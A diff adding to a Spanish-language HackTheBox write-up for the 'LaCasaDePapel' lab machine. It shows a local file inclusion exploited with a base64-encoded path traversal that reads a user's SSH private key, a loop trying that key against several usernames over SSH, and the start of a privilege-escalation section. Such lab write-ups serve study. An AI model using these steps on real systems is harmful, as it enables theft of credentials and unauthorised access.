@@ -33,8 +33,26 @@ Para iniciar el firefox con proxychains tienes que ver el output parecido a este
 
 ### LFI 
 
-Nos encontramos un LFI
+Nos encontramos un LFI y encontramos un id_rsa para probar la key con todos los usuarios 
 
+```
+ proxychains curl http://localhost:8000/file/$(echo -n "../.ssh/id_rsa" | base64)
+[1] 0:zsh  1:ssh  2:zsh  3:zsh  4:zsh  5:firefox-esr  6:zsh* 7:ssh-                     
+
+for user in berlin dali nairobi oslo professor; do ssh -oBatchMode=yes -i ~/id_rsa_lacasadepapel_berlin $user@10.10.10.131; done
+```
+
+
+## Priv esca
+
+Nos damos cuenta que existe un proceso que se ejecuta desde la carpeta del profesor y que incluso cambia de pid cada minuto lo que sugiere que se esta ejecutando recurrentemente.
+
+
+```
+ps aux | grep "mem"
+```
+
+![image](https://github.com/gecr07/lacasadepapel_HTB/assets/63270579/6ca70276-05cd-41c6-bfc0-e268442d3766)
 
 
 
